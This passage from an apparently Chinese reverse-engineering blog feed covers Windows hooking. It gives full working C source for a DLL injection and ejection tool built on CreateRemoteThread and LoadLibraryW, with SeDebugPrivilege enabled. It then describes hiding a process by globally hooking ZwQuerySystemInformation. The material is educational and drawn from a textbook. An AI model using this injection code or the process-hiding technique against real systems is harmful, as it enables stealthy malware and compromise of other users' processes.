class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tlhelp32.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"winbase.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tchar.h"</span></span></div><div class="line"></div><div class="line"><span class="comment">//使用方式</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"\nInjectDll.exe by ReverseCore\n"</span></div><div class="line"><span class="string">"- blog  : http://www.reversecore.com\n"</span></div><div class="line"><span class="string">"- email : reversecore@gmail.com\n\n"</span></div><div class="line"><span class="string">"- USAGE : hookdiat.exe &lt;i|e&gt; &lt;PID&gt; &lt;dll_path&gt;\n\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//钩取hook</span></div><div class="line"><span class="function">BOOL <span class="title">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllName)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">HANDLE hProcess, hThread;</div><div class="line">LPVOID pRemoteBuf;</div><div class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllName) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</div><div class="line">LPTHREAD_START_ROUTINE pThreadProc;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))</div><div class="line">&#123;</div><div class="line">DWORD dwErr = GetLastError();</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</div><div class="line"></div><div class="line">WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName, dwBufSize, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(<span class="string">L"kernel32.dll"</span>), <span class="string">"LoadLibraryW"</span>);</div><div class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</div><div class="line">WaitForSingleObject(hThread, INFINITE);</div><div class="line"></div><div class="line">CloseHandle(hThread);</div><div class="line">CloseHandle(hProcess);</div><div class="line"></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//脱钩</span></div><div class="line"><span class="function">BOOL <span class="title">EjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllName)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">BOOL bMore = FALSE, bFound = FALSE;</div><div class="line">HANDLE hSnapshot, hProcess, hThread;</div><div class="line">MODULEENTRY32 me = &#123; <span class="keyword">sizeof</span>(me) &#125;;</div><div class="line">LPTHREAD_START_ROUTINE pThreadProc;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == (hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)))</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line"></div><div class="line">bMore = Module32First(hSnapshot, &amp;me);</div><div class="line"><span class="keyword">for</span> (; bMore; bMore = Module32Next(hSnapshot, &amp;me))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (!_tcsicmp(me.szModule, szDllName) || !_tcsicmp(me.szExePath, szDllName))</div><div class="line">&#123;</div><div class="line">bFound = TRUE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!bFound)</div><div class="line">&#123;</div><div class="line">CloseHandle(hSnapshot);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))</div><div class="line">&#123;</div><div class="line">CloseHandle(hSnapshot);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(<span class="string">L"kernel32.dll"</span>), <span class="string">"FreeLibrary"</span>);</div><div class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, me.modBaseAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</div><div class="line">WaitForSingleObject(hThread, INFINITE);</div><div class="line"></div><div class="line">CloseHandle(hThread);</div><div class="line">CloseHandle(hProcess);</div><div class="line">CloseHandle(hSnapshot);</div><div class="line"></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">DWORD _EnableNTPrivilege(LPCTSTR szPrivilege, DWORD dwState)</div><div class="line">&#123;</div><div class="line">DWORD dwRtn = <span class="number">0</span>;</div><div class="line">HANDLE hToken;</div><div class="line"><span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(),</div><div class="line">TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))</div><div class="line">&#123;</div><div class="line">LUID luid;</div><div class="line"><span class="keyword">if</span> (LookupPrivilegeValue(<span class="literal">NULL</span>, szPrivilege, &amp;luid))</div><div class="line">&#123;</div><div class="line">BYTE t1[<span class="keyword">sizeof</span>(TOKEN_PRIVILEGES) + <span class="keyword">sizeof</span>(LUID_AND_ATTRIBUTES)];</div><div class="line">BYTE t2[<span class="keyword">sizeof</span>(TOKEN_PRIVILEGES) + <span class="keyword">sizeof</span>(LUID_AND_ATTRIBUTES)];</div><div class="line">DWORD cbTP = <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES) + <span class="keyword">sizeof</span>(LUID_AND_ATTRIBUTES);</div><div class="line"></div><div class="line">PTOKEN_PRIVILEGES pTP = (PTOKEN_PRIVILEGES)t1;</div><div class="line">PTOKEN_PRIVILEGES pPrevTP = (PTOKEN_PRIVILEGES)t2;</div><div class="line"></div><div class="line">pTP-&gt;PrivilegeCount = <span class="number">1</span>;</div><div class="line">pTP-&gt;Privileges[<span class="number">0</span>].Luid = luid;</div><div class="line">pTP-&gt;Privileges[<span class="number">0</span>].Attributes = dwState;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (AdjustTokenPrivileges(hToken, FALSE, pTP, cbTP, pPrevTP, &amp;cbTP))</div><div class="line">dwRtn = pPrevTP-&gt;Privileges[<span class="number">0</span>].Attributes;</div><div class="line">&#125;</div><div class="line"></div><div class="line">CloseHandle(hToken);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> dwRtn;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//主函数</span></div><div class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, TCHAR* argv[])</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (argc != <span class="number">4</span>) <span class="comment">//参数是不是4个</span></div><div class="line">&#123;</div><div class="line">usage();</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// adjust privilege</span></div><div class="line">_EnableNTPrivilege(SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!_tcsicmp(argv[<span class="number">1</span>], <span class="string">L"i"</span>)) <span class="comment">//判断是钩取</span></div><div class="line">InjectDll((DWORD)_tstoi(argv[<span class="number">2</span>]), argv[<span class="number">3</span>]);</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!_tcsicmp(argv[<span class="number">1</span>], <span class="string">L"e"</span>))<span class="comment">//判断是脱钩</span></div><div class="line">EjectDll((DWORD)_tstoi(argv[<span class="number">2</span>]), argv[<span class="number">3</span>]);</div><div class="line"></div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>运行结果:<br>钩取<br><img src="https://i.imgur.com/R54UpIg.png" alt=""><br>脱钩<br><img src="https://i.imgur.com/rUsuZTW.png" alt=""></p><p>个人总结:通过PE文件的结构，先获取线程基址，从ImageBase开始，经由PE签名找到IDT：<br>ImageBase-&gt;IDT-&gt;IAT(dll)-&gt;函数</p><h1 id="方式3——进程隐藏"><a href="#方式3——进程隐藏" class="headerlink" title="方式3——进程隐藏"></a>方式3——进程隐藏</h1><p>进程隐藏就是将要隐藏的进程藏在其他的进程中，实现进程隐藏的关键不是进程本身，而是其他进程。其中用户模式下最常用的是ntdll.ZwQuerySystemInformation() API钩取技术。</p><p>假如我们要隐藏test.exe进程，那么就要钩取ProcExp.exe(进程查看器或taskmgr.exe任务管理器)的ntdll.ZwQuerySystemInformation() API，</p><h2 id="2个问题"><a href="#2个问题" class="headerlink" title="2个问题"></a>2个问题</h2><p>1、钩取的进程数<br>如果进程查看器和任务管理器多开几个，那么进程钩取一个，那是不可以的，所以要钩取系统中运行的所有进程。<br>2、新创进程<br>如果当钩取了系统中运行的所有进程，这时又新建一个ProcExp.exe，而这个进程又没有被钩取。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>对于上面2个问题，我们隐藏test.exe进程时需要钩取系统中运行的所有进程的ntdll.ZwQuerySystemInformation() API，并且对后面将要启动的所有进程也进行相同的操作(当然这是全自动的啦)，这叫全局钩取。</p><h1 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h1><p>逆向工程核心原理</p><h2 id="最后，文学还是很重要的，借助诗圣两句提高文学素养"><a href="#最后，文学还是很重要的，借助诗圣两句提高文学素养" class="headerlink" title="最后，文学还是很重要的，借助诗圣两句提高文学素养"></a>最后，文学还是很重要的，借助诗圣两句提高文学素养</h2><p>绝代有佳人，幽居在空谷。<br>但见新人笑，那闻旧人哭。<br>——佳人</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;逆向分析之”花”。windows的Hook是程序设计中最为灵活多变的技巧之一。Hook有两种含义:1、系统提供的消息Hook机制;2、自定义的Hook编程技巧，&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
</feed>
